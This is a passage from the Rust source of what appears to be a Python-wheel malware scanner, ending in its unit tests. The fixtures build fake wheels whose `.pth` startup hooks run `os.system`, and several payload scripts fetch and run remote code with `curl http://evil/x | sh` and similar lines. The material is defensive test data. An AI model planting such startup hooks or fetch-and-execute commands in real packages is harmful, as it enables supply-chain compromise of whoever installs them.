    }
    evidence.to_string()
}

/// Whether a token looks like a file/dir reference worth resolving: it contains a
/// path separator or a filename extension, and is not a bare URL/scheme. A plain
/// word with neither (`payload`, `os`) is rejected here — resolution is by exact
/// owned PATH, not a basename guess (a bare-name match would reintroduce the
/// unrelated-payload false positive the ownership tightening removes).
fn looks_path_ish(token: &str) -> bool {
    let t = token.trim();
    if t.is_empty() || t.len() > 256 {
        return false;
    }
    // Reject obvious URLs/schemes — those are handled by the network rules, not
    // ownership resolution.
    if t.contains("://") {
        return false;
    }
    t.contains('/') || t.contains('\\') || (t.contains('.') && !t.starts_with('.'))
}

/// The dotted module names named by an `import` / `__import__` / `import_module` in
/// a line. Conservative: it scans for the keyword and takes the following
/// dotted-identifier run. Only modules with a `.` (a package path) are returned, so
/// a top-level single-segment import (`import os`) is not turned into a candidate
/// (it could not own a multi-segment member path anyway, and the payload split is
/// always into a package subpath).
fn dotted_import_modules(line: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for keyword in ["import_module", "__import__", "import "] {
        let mut search_from = 0usize;
        while let Some(pos) = line[search_from..].find(keyword) {
            let abs = search_from + pos + keyword.len();
            // Skip separators/openers between the keyword and the module name.
            let tail = line[abs..].trim_start_matches([' ', '(', '\'', '"']);
            let module: String = tail
                .chars()
                .take_while(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '.')
                .collect();
            let module = module.trim_matches('.').to_string();
            if module.contains('.') {
                out.push(module);
            }
            search_from = abs;
        }
    }
    out
}

/// Whether a member kind is a PAYLOAD a cross-distribution loader could execute (a
/// bundled script, native module, or wasm). Python source is intentionally NOT a
/// payload kind here: a loader importing a sibling Python module is ordinary; the
/// campaign's split hands off to a SCRIPT/native runtime, which is what we flag.
fn is_payload_kind(kind: ArtifactFileKind) -> bool {
    matches!(
        kind,
        ArtifactFileKind::Script | ArtifactFileKind::NativeModule | ArtifactFileKind::WasmModule
    )
}

/// Whether two distribution identities are the same artifact in a set (same name +
/// same identity location).
fn same_distribution(a: &DistributionIdentity, b: &DistributionIdentity) -> bool {
    a.name == b.name && a.dist_info_path == b.dist_info_path
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write as _;
    use zip::write::SimpleFileOptions;
    use zip::ZipWriter;

    /// Build an in-memory wheel zip from (member, body) pairs.
    fn build_wheel(members: &[(&str, &[u8])]) -> Vec<u8> {
        let mut zw = ZipWriter::new(std::io::Cursor::new(Vec::new()));
        for (name, body) in members {
            zw.start_file(*name, SimpleFileOptions::default()).unwrap();
            zw.write_all(body).unwrap();
        }
        zw.finish().unwrap().into_inner()
    }

    /// Write `bytes` to a temp file named `name`, returning the path (and keeping
    /// the tempdir alive via the returned guard).
    fn write_temp(dir: &tempfile::TempDir, name: &str, bytes: &[u8]) -> PathBuf {
        let p = dir.path().join(name);
        std::fs::write(&p, bytes).unwrap();
        p
    }

    #[test]
    fn sniff_recognizes_zip_and_gzip() {
        assert_eq!(sniff_magic(b"PK\x03\x04rest"), ArtifactMagic::Zip);
        assert_eq!(sniff_magic(b"PK\x05\x06"), ArtifactMagic::Zip);
        assert_eq!(sniff_magic(&[0x1f, 0x8b, 0x08, 0x00]), ArtifactMagic::Gzip);
        assert_eq!(sniff_magic(b"not a zip"), ArtifactMagic::Unknown);
        assert_eq!(sniff_magic(b""), ArtifactMagic::Unknown);
    }

    #[test]
    fn clean_wheel_inspects_to_no_findings() {
        let dir = tempfile::tempdir().unwrap();
        let bytes = build_wheel(&[
            ("demo/__init__.py", b"print('hi')\n"),
            (
                "demo-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n",
            ),
            ("demo-1.0.dist-info/WHEEL", b"Wheel-Version: 1.0\n"),
            (
                "demo-1.0.dist-info/RECORD",
                b"demo/__init__.py,sha256=2Vn9kQq8iDQA4F1pHbZ5gQ7Hq6oq7e8gWQ1xMrr0vY,12\n\
                  demo-1.0.dist-info/RECORD,,\n",
            ),
        ]);
        let path = write_temp(&dir, "demo-1.0-py3-none-any.whl", &bytes);
        let inspected = inspect_artifact_file(&path).expect("inspect");
        assert!(!inspected.rejected, "a clean wheel is not rejected");
        // The clean wheel has a (deliberately wrong) RECORD hash above to keep the
        // test self-contained; the IMPORTANT invariant is no startup/native finding.
        let findings = crate::artifact::correlate::correlate_inspection_findings(
            &inspected.inspection,
            &inspected.native_findings,
            None,
        );
        assert!(
            findings.iter().all(|f| f.rule_id
                != crate::verdict::RuleId::PythonStartupHookSuspicious
                && f.rule_id != crate::verdict::RuleId::NativeImportExecutionChain),
            "clean wheel must not fire startup/native findings: {findings:?}"
        );
    }

    #[test]
    fn unsupported_sdist_is_unsupported_error() {
        let dir = tempfile::tempdir().unwrap();
        // gzip magic, named .tar.gz
        let path = write_temp(&dir, "demo-1.0.tar.gz", &[0x1f, 0x8b, 0x08, 0x00, 0, 0]);
        let err = inspect_artifact_file(&path).unwrap_err();
        assert_eq!(err, ArtifactInspectError::Unsupported);
        assert_eq!(err.gap_kind(), CoverageGapKind::Unsupported);
    }

    #[test]
    fn missing_file_is_unreadable() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("nope-1.0-py3-none-any.whl");
        let err = inspect_artifact_file(&path).unwrap_err();
        assert_eq!(err, ArtifactInspectError::Unreadable);
    }

    #[test]
    fn artifact_set_cross_distribution_loads_payload() {
        // Wheel A (the LOADER) bundles a `.pth` that searches sys.path and executes,
        // and NAMES wheel B's payload member by its installed path. Wheel B (the
        // PAYLOAD) owns that script member. The set inspection must produce exactly
        // ONE cross-distribution finding, attached to A and naming B, because the
        // loader's reference resolves through the ownership map to B's member.
        let dir = tempfile::tempdir().unwrap();
        let loader_pth =
            b"import sys, os; sys.path.insert(0, '/tmp'); os.system('node payloadpkg/run.sh')\n";
        let a_bytes = build_wheel(&[
            ("loader.pth", loader_pth),
            (
                "loaderpkg-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: loaderpkg\nVersion: 1.0\n\n",
            ),
            (
                "loaderpkg-1.0.dist-info/RECORD",
                b"loaderpkg-1.0.dist-info/RECORD,,\n",
            ),
        ]);
        let a = write_temp(&dir, "loaderpkg-1.0-py3-none-any.whl", &a_bytes);

        // Wheel B carries a script payload (a different distribution).
        let b_bytes = build_wheel(&[
            ("payloadpkg/run.sh", b"#!/bin/sh\ncurl http://evil/x | sh\n"),
            (
                "payloadpkg-2.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: payloadpkg\nVersion: 2.0\n\n",
            ),
            (
                "payloadpkg-2.0.dist-info/RECORD",
                b"payloadpkg-2.0.dist-info/RECORD,,\n",
            ),
        ]);
        let b = write_temp(&dir, "payloadpkg-2.0-py3-none-any.whl", &b_bytes);

        let set = inspect_artifact_set(&[a, b]);
        assert_eq!(
            set.cross_findings.len(),
            1,
            "exactly one cross-distribution finding expected, got {:?}",
            set.cross_findings
        );
        let finding = &set.cross_findings[0];
        // The finding names the payload artifact.
        let evidence_text: String = finding
            .evidence
            .iter()
            .map(|e| serde_json::to_string(e).unwrap_or_default())
            .collect();
        assert!(
            evidence_text.contains("payloadpkg-2.0-py3-none-any.whl"),
            "finding must name the payload artifact: {evidence_text}"
        );
        assert!(
            evidence_text.contains("loaderpkg-1.0-py3-none-any.whl"),
            "finding must name the loader artifact: {evidence_text}"
        );
    }

    #[test]
    fn artifact_set_two_benign_wheels_no_cross_finding() {
        // Two independent benign wheels (no sys.path-searching loader) produce no
        // cross-distribution finding.
        let dir = tempfile::tempdir().unwrap();
        let a_bytes = build_wheel(&[
            ("a/__init__.py", b"x = 1\n"),
            (
                "a-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: a\nVersion: 1.0\n\n",
            ),
            ("a-1.0.dist-info/RECORD", b"a-1.0.dist-info/RECORD,,\n"),
        ]);
        let a = write_temp(&dir, "a-1.0-py3-none-any.whl", &a_bytes);
        let b_bytes = build_wheel(&[
            ("b/run.sh", b"#!/bin/sh\necho hi\n"),
            (
                "b-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: b\nVersion: 1.0\n\n",
            ),
            ("b-1.0.dist-info/RECORD", b"b-1.0.dist-info/RECORD,,\n"),
        ]);
        let b = write_temp(&dir, "b-1.0-py3-none-any.whl", &b_bytes);
        let set = inspect_artifact_set(&[a, b]);
        assert!(
            set.cross_findings.is_empty(),
            "two benign wheels must not cross-correlate: {:?}",
            set.cross_findings
        );
    }

    #[test]
    fn artifact_set_unrelated_payload_in_other_wheel_no_cross_finding() {
        // PR-I: real ownership resolution. The loader has an executing,
        // sys.path-searching startup hook, but it references its OWN sibling module
        // path ('loaderpkg/local.py'), NOT anything wheel B owns. Wheel B carries an
        // unrelated payload-shaped member ('otherpkg/analytics.js'). Under the old
        // any-foreign-payload heuristic this produced a (Medium) cross finding; with
        // ownership resolution it must produce NONE, because the loader never names
        // B's member.
        let dir = tempfile::tempdir().unwrap();
        let loader_pth =
            b"import sys, os; sys.path.insert(0, '.'); os.system('python loaderpkg/local.py')\n";
        let a_bytes = build_wheel(&[
            ("loader.pth", loader_pth),
            ("loaderpkg/local.py", b"print('local')\n"),
            (
                "loaderpkg-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: loaderpkg\nVersion: 1.0\n\n",
            ),
            (
                "loaderpkg-1.0.dist-info/RECORD",
                b"loaderpkg-1.0.dist-info/RECORD,,\n",
            ),
        ]);
        let a = write_temp(&dir, "loaderpkg-1.0-py3-none-any.whl", &a_bytes);

        let b_bytes = build_wheel(&[
            ("otherpkg/analytics.js", b"console.log('unrelated')\n"),
            (
                "otherpkg-2.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: otherpkg\nVersion: 2.0\n\n",
            ),
            (
                "otherpkg-2.0.dist-info/RECORD",
                b"otherpkg-2.0.dist-info/RECORD,,\n",
            ),
        ]);
        let b = write_temp(&dir, "otherpkg-2.0-py3-none-any.whl", &b_bytes);

        let set = inspect_artifact_set(&[a, b]);
        assert!(
            set.cross_findings.is_empty(),
            "an unrelated payload the loader never references must not cross-correlate: {:?}",
            set.cross_findings
        );
    }

    #[test]
    fn artifact_set_reference_resolves_only_to_named_owner() {
        // PR-I: a loader reference resolves only to the ACTUAL owner. The loader
        // names a payload by its installed path; wheel B owns exactly that path and
        // wheel C owns a DIFFERENT, unreferenced payload member. The cross finding
        // must name B (the referenced owner) and must NOT name C. The loader does not
        // launch a foreign runtime, so the finding is High (not the old Medium
        // stopgap, not Critical).
        let dir = tempfile::tempdir().unwrap();
        let loader_pth = b"import sys; sys.path.insert(0, '.'); import targetpkg.payload\n";
        let a_bytes = build_wheel(&[
            ("loader.pth", loader_pth),
            (
                "loaderpkg-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: loaderpkg\nVersion: 1.0\n\n",
            ),
            (
                "loaderpkg-1.0.dist-info/RECORD",
                b"loaderpkg-1.0.dist-info/RECORD,,\n",
            ),
        ]);
        let a = write_temp(&dir, "loaderpkg-1.0-py3-none-any.whl", &a_bytes);

        // Wheel B owns the referenced module path as a NATIVE payload member.
        let b_bytes = build_wheel(&[
            ("targetpkg/payload.so", b"\x7fELF stub\n"),
            (
                "targetpkg-2.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: targetpkg\nVersion: 2.0\n\n",
            ),
            (
                "targetpkg-2.0.dist-info/RECORD",
                b"targetpkg-2.0.dist-info/RECORD,,\n",
            ),
        ]);
        let b = write_temp(&dir, "targetpkg-2.0-py3-none-any.whl", &b_bytes);

        // Wheel C owns an UNREFERENCED payload member.
        let c_bytes = build_wheel(&[
            ("decoypkg/other.sh", b"#!/bin/sh\necho decoy\n"),
            (
                "decoypkg-3.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: decoypkg\nVersion: 3.0\n\n",
            ),
            (
                "decoypkg-3.0.dist-info/RECORD",
                b"decoypkg-3.0.dist-info/RECORD,,\n",
            ),
        ]);
        let c = write_temp(&dir, "decoypkg-3.0-py3-none-any.whl", &c_bytes);

        let set = inspect_artifact_set(&[a, b, c]);
        assert_eq!(
            set.cross_findings.len(),
            1,
            "exactly one cross finding (the referenced owner) expected: {:?}",
            set.cross_findings
        );
        let finding = &set.cross_findings[0];
        assert_eq!(
            finding.severity,
            crate::verdict::Severity::High,
            "a resolved reference without a foreign-runtime launch is High"
        );
        let evidence_text: String = finding
            .evidence
            .iter()
            .map(|e| serde_json::to_string(e).unwrap_or_default())
            .collect();
        assert!(
            evidence_text.contains("targetpkg-2.0-py3-none-any.whl"),
            "finding must name the referenced owner B: {evidence_text}"
        );
        assert!(
            !evidence_text.contains("decoypkg-3.0-py3-none-any.whl"),
            "finding must NOT name the unreferenced wheel C: {evidence_text}"
        );
    }

    #[test]
    fn wheel_with_executable_pth_fires_suspicious() {
        let dir = tempfile::tempdir().unwrap();
        // A .pth that executes a subprocess at startup (the B6 case).
        let pth = b"import os; os.system('curl http://evil.example/x | sh')\n";
        let bytes = build_wheel(&[
            ("evil.pth", pth),
            (
                "demo-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n",
            ),
            (
                "demo-1.0.dist-info/RECORD",
                b"demo-1.0.dist-info/RECORD,,\n",
            ),
        ]);
        let path = write_temp(&dir, "demo-1.0-py3-none-any.whl", &bytes);
        let inspected = inspect_artifact_file(&path).expect("inspect");
        let findings = crate::artifact::correlate::correlate_inspection_findings(
            &inspected.inspection,
            &inspected.native_findings,
            None,
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == crate::verdict::RuleId::PythonStartupHookSuspicious),
            "an executable .pth must fire the suspicious startup finding: {findings:?}"
        );
    }

    /// T1.4: `inspect_artifact_file` opens the file ONCE and hashes the SAME open
    /// file description it streams the archive from. The recorded artifact sha256
    /// must therefore equal an independent digest of the file's bytes AND the
    /// archive must have streamed successfully (members present) from that same
    /// handle — proving one open backed both the hash and the analysis, not two
    /// reopens that a swap could split apart.
    #[test]
    fn inspect_artifact_file_uses_one_handle() {
        use sha2::{Digest, Sha256};
        let dir = tempfile::tempdir().unwrap();
        let bytes = build_wheel(&[
            ("demo/__init__.py", b"x = 1\n"),
            (
                "demo-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n",
            ),
            (
                "demo-1.0.dist-info/RECORD",
                b"demo-1.0.dist-info/RECORD,,\n",
            ),
        ]);
        let path = write_temp(&dir, "demo-1.0-py3-none-any.whl", &bytes);

        // Independent reference digest of the exact file bytes (NEVER shelling out).
        let expected: String = Sha256::digest(&bytes)
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect();

        let inspected = inspect_artifact_file(&path).expect("inspect");
        let recorded = match &inspected.inspection.subject {
            InspectionSubject::Artifact(a) => a.sha256.clone(),
            other => panic!("a wheel must inspect to an Artifact subject, got {other:?}"),
        };
        assert_eq!(
            recorded, expected,
            "the recorded artifact hash must be the digest of the SAME bytes the \
             archive reader saw (one open file description, not a stat-then-reopen)"
        );
        // The archive actually streamed from that same handle: members are present.
        assert!(
            !inspected.inspection.files.is_empty(),
            "the archive must have streamed members from the same handle the hash used"
        );
    }

    /// T1.5 (regression of the campaign case): a cross-distribution loader that
    /// ALSO launches a foreign runtime (the real campaign signature) stays Critical
    /// and a hard Block.
    #[test]
    fn cross_distribution_cross_runtime_still_critical() {
        let dir = tempfile::tempdir().unwrap();
        // Loader `.pth`: searches sys.path AND launches node (cross-runtime) on a
        // script member OWNED by the payload wheel (`payloadpkg/run.sh`), so the
        // reference resolves through the ownership map.
        let loader_pth =
            b"import sys, os; sys.path.insert(0, '/tmp'); os.system('node payloadpkg/run.sh')\n";
        let a_bytes = build_wheel(&[
            ("loader.pth", loader_pth),
            (
                "loaderpkg-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: loaderpkg\nVersion: 1.0\n\n",
            ),
            (
                "loaderpkg-1.0.dist-info/RECORD",
                b"loaderpkg-1.0.dist-info/RECORD,,\n",
            ),
        ]);
        let a = write_temp(&dir, "loaderpkg-1.0-py3-none-any.whl", &a_bytes);
        // Payload wheel (a different distribution) carries a script payload.
        let b_bytes = build_wheel(&[
            ("payloadpkg/run.sh", b"#!/bin/sh\ncurl http://evil/x | sh\n"),
            (
                "payloadpkg-2.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: payloadpkg\nVersion: 2.0\n\n",
            ),
            (
                "payloadpkg-2.0.dist-info/RECORD",
                b"payloadpkg-2.0.dist-info/RECORD,,\n",
            ),
        ]);
        let b = write_temp(&dir, "payloadpkg-2.0-py3-none-any.whl", &b_bytes);

        let set = inspect_artifact_set(&[a, b]);
        assert_eq!(set.cross_findings.len(), 1, "one cross finding expected");
        let f = &set.cross_findings[0];
        assert_eq!(
            f.rule_id,
            crate::verdict::RuleId::PythonStartupHookCrossRuntime,
            "a cross-runtime loader is the campaign signature"
        );
        assert_eq!(
            f.severity,
            crate::verdict::Severity::Critical,
            "the cross-runtime case must stay Critical (a hard Block)"
        );
    }

    /// PR-I (real ownership resolution): a cross-distribution split with NO
    /// cross-runtime launch, but where the loader's executing startup line RESOLVES a
    /// reference through the ownership map to a payload-shaped member owned by another
    /// distribution, is now High (a hard Block) — the earlier Medium "severity
    /// downgrade stopgap" is gone, because the reference now genuinely names the
    /// foreign-owned payload (an unrelated payload the loader never names produces no
    /// cross finding at all; see `artifact_set_unrelated_payload_in_other_wheel_*`).
    #[test]
    fn cross_distribution_non_cross_runtime_resolved_reference_is_block() {
        use crate::verdict::{action_from_findings, Action, Severity};
        let dir = tempfile::tempdir().unwrap();
        // Loader `.pth`: searches sys.path AND executes a subprocess on a script
        // member OWNED by the payload wheel (`payloadpkg/helper.sh`), but launches NO
        // foreign runtime (no node/bun/deno) — so it is NOT cross-runtime.
        let loader_pth =
            b"import sys, os; sys.path.insert(0, '/tmp'); os.system('sh payloadpkg/helper.sh')\n";
        let a_bytes = build_wheel(&[
            ("loader.pth", loader_pth),
            (
                "loaderpkg-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: loaderpkg\nVersion: 1.0\n\n",
            ),
            (
                "loaderpkg-1.0.dist-info/RECORD",
                b"loaderpkg-1.0.dist-info/RECORD,,\n",
            ),
        ]);
        let a = write_temp(&dir, "loaderpkg-1.0-py3-none-any.whl", &a_bytes);
        // The payload wheel ships the referenced script member.
        let b_bytes = build_wheel(&[
            ("payloadpkg/helper.sh", b"#!/bin/sh\necho hi\n"),
            (
                "payloadpkg-2.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: payloadpkg\nVersion: 2.0\n\n",
            ),
            (
                "payloadpkg-2.0.dist-info/RECORD",
                b"payloadpkg-2.0.dist-info/RECORD,,\n",
            ),
        ]);
        let b = write_temp(&dir, "payloadpkg-2.0-py3-none-any.whl", &b_bytes);

        let set = inspect_artifact_set(&[a, b]);
        assert_eq!(set.cross_findings.len(), 1, "one cross finding expected");
        let f = &set.cross_findings[0];
        assert_eq!(
            f.severity,
            Severity::High,
            "a resolved non-cross-runtime reference is High (a Block), not the old Medium stopgap"
        );
        assert_eq!(
            action_from_findings(std::slice::from_ref(f)),
            Action::Block,
            "High derives to Block, so a resolved cross-distribution reference hard-Blocks on its own"
        );
        // Full evidence is still attached: loader and payload artifacts are named.
        let evidence_text: String = f
            .evidence
            .iter()
            .map(|e| serde_json::to_string(e).unwrap_or_default())
            .collect();
        assert!(
            evidence_text.contains("loaderpkg-1.0-py3-none-any.whl")
                && evidence_text.contains("payloadpkg-2.0-py3-none-any.whl"),
            "the finding must name the loader and payload: {evidence_text}"
        );

        // The full set verdict is a hard Block (both the cross finding and the
        // loader's own per-artifact correlation contribute).
        let all = set.all_findings(None);
        assert_eq!(
            action_from_findings(&all),
            Action::Block,
            "the full set verdict hard-Blocks: {:?}",
            all.iter()
                .map(|f| (f.rule_id, f.severity))
                .collect::<Vec<_>>()
        );
    }

    /// T3.24: two wheels with the SAME filename in DIFFERENT directories are
    /// DISTINCT distributions, so a cross-distribution split between them is found
    /// (it would be collapsed and MISSED if identity keyed on the bare filename).
    #[test]
    fn same_distribution_distinguishes_identical_names_in_different_dirs() {
        let base = tempfile::tempdir().unwrap();
        let dir_a = base.path().join("a");
        let dir_b = base.path().join("b");
        std::fs::create_dir_all(&dir_a).unwrap();
        std::fs::create_dir_all(&dir_b).unwrap();

        // Both wheels share the project NAME and FILENAME, differing only in dir.
        // Wheel A is the cross-runtime loader and references wheel B's payload member
        // by its installed path (`dup/run.sh`); wheel B ships that script payload.
        let loader_pth =
            b"import sys, os; sys.path.insert(0, '/tmp'); os.system('node dup/run.sh')\n";
        let a_bytes = build_wheel(&[
            ("loader.pth", loader_pth),
            (
                "dup-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: dup\nVersion: 1.0\n\n",
            ),
            ("dup-1.0.dist-info/RECORD", b"dup-1.0.dist-info/RECORD,,\n"),
        ]);
        let b_bytes = build_wheel(&[
            ("dup/run.sh", b"#!/bin/sh\ncurl http://evil/x | sh\n"),
            (
                "dup-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: dup\nVersion: 1.0\n\n",
            ),
            ("dup-1.0.dist-info/RECORD", b"dup-1.0.dist-info/RECORD,,\n"),
        ]);
        let name = "dup-1.0-py3-none-any.whl";
        let a = dir_a.join(name);
        let b = dir_b.join(name);
        std::fs::write(&a, &a_bytes).unwrap();
        std::fs::write(&b, &b_bytes).unwrap();

        // Direct identity check: same name, different on-disk path -> NOT the same
        // distribution (the regression: bare-filename keying would call them equal).
        let set = inspect_artifact_set(&[a, b]);
        let id_a = member_distribution_identity(&set.members[0]).expect("identity a");
        let id_b = member_distribution_identity(&set.members[1]).expect("identity b");
        assert_eq!(
            id_a.name, id_b.name,
            "test premise: identical project names"
        );
        assert!(
            !same_distribution(&id_a, &id_b),
            "same filename in different dirs must NOT be the same distribution"
        );
        // And the split between them is therefore found, not collapsed.
        assert_eq!(
            set.cross_findings.len(),
            1,
            "a split between two identically named wheels in different dirs must be found: {:?}",
            set.cross_findings
        );
    }

    /// T3.25: a successful zero-byte read sniffs Unknown (-> Unsupported), but a
    /// read I/O FAULT is `Unreadable`, not folded into `n = 0` and mislabeled
    /// Unsupported. Tested at the seam with a reader that errors on `read`.
    #[test]
    fn sniff_magic_read_error_is_unreadable_not_unknown() {
        use std::io::{self, Read, Seek, SeekFrom};

        // A Read + Seek that always faults on read (seek is fine).
        struct ErrReader;
        impl Read for ErrReader {
            fn read(&mut self, _buf: &mut [u8]) -> io::Result<usize> {
                Err(io::Error::other("simulated read fault"))
            }
        }
        impl Seek for ErrReader {
            fn seek(&mut self, _pos: SeekFrom) -> io::Result<u64> {
                Ok(0)
            }
        }
        assert_eq!(
            sniff_head(&mut ErrReader),
            Err(ArtifactInspectError::Unreadable),
            "a read fault must be Unreadable, not Unknown/Unsupported"
        );

        // CONTRAST: a successful EOF (0 bytes) is Unknown, NOT Unreadable.
        let mut empty = std::io::Cursor::new(Vec::<u8>::new());
        assert_eq!(
            sniff_head(&mut empty),
            Ok(ArtifactMagic::Unknown),
            "a clean empty read is Unknown magic, not an Unreadable fault"
        );
    }
}
